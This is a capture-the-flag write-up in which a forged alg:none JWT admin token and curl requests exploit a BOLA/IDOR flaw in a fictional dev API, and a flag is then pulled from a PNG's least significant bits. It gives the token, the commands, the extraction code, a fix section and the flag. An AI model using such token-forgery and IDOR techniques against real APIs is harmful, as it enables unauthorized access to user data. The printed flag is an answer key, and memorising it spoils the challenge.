#### Challenge:

Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!

---

#### Solution:

Chapter 3 established that the **dev** API (`untraceable-dev-api.theylietoyou.tcc`) never verifies the
JWT signature, so a forged `alg:none` admin token turns `GET /api/admin/users/{userId}/meta/{metaId}`
into a full **BOLA/IDOR**, and `/api/admin/conf` leaks the metaId arithmetic. The same `Data` metaKey
(`fieldOffset 99`) that looked like an encrypted blob everywhere else is where the "hidden
information" lives — for one user it is an image with the flag buried in its pixels.

**1. Reuse the forged admin token and the formula.**

```bash
DEV=http://untraceable-dev-api.theylietoyou.tcc
TOK="eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6IkFETUlOIiwidXNlcm5hbWUiOiJhZG1pbiJ9."
# Data metaId = baseOffset(154700) + userId*1000 + fieldOffset(99)
```

**2. Harvest every user's `Data` blob.** 35 of the 36 users return a **128-byte base64 ciphertext**
(uniform length, `valid:true`) — but **userId 17**'s `Data` is different: it base64-decodes to a
**PNG** (256×256, RGBA). `metaId = 154700 + 17*1000 + 99 = 171799`.

```bash
curl -s "$DEV/api/admin/users/17/meta/171799" -H "Authorization: Bearer $TOK" \
  | python3 -c "import json,sys,base64;open('u17.png','wb').write(base64.b64decode(json.load(sys.stdin)['content']))"
file u17.png            # PNG image data, 256 x 256, 8-bit/color RGBA
```

**3. Read the hint and the stego.** The PNG carries a `tEXt`/`Comment` chunk that base64-decodes to
`stegano.theylietoyou.tcc` — a pointer at steganography. The flag is stored in the **LSBs of the RGBA
channels** (x/y pixel order), prefixed by a 4-byte big-endian length (`0x19` = 25 chars):

```bash
zsteg -E 'b1,rgba,lsb,xy' u17.png | grep -oE 'FLAG\{[^}]*\}'
# FLAG{EcfI-bCKg-7x4I-nYlC}
```

Equivalent manual extraction (no `zsteg`):

```python
from PIL import Image
px = list(Image.open('u17.png').convert('RGBA').getdata())
bits = ''.join(str(v & 1) for p in px for v in p)
n = int(bits[:32], 2)                                  # 25
out = bytes(int(bits[32+i*8:40+i*8], 2) for i in range(n))
print(out.decode())                                    # FLAG{EcfI-bCKg-7x4I-nYlC}
```

**Dangling trail.** The other 35 users' `Data` fields are each exactly **128 raw bytes** of base64 —
the hallmark of RSA-1024 / fixed-block ciphertext, almost certainly the payload for a later "decrypt"
chapter. No decryption key turned up in the dev/prod bundles, `/api/admin/conf`, `/actuator`, or
`/v3/api-docs`.

**Fix:** never stash sensitive artifacts in user metadata that is reachable by IDOR; strip
metadata/EXIF and re-encode user-supplied images so hidden LSB payloads cannot survive; and (again)
enforce object-level authorization and JWT signature verification in *every* environment, dev
included.

---

<details><summary>FLAG:</summary>

```
FLAG{EcfI-bCKg-7x4I-nYlC}
```

</details>
<br/>
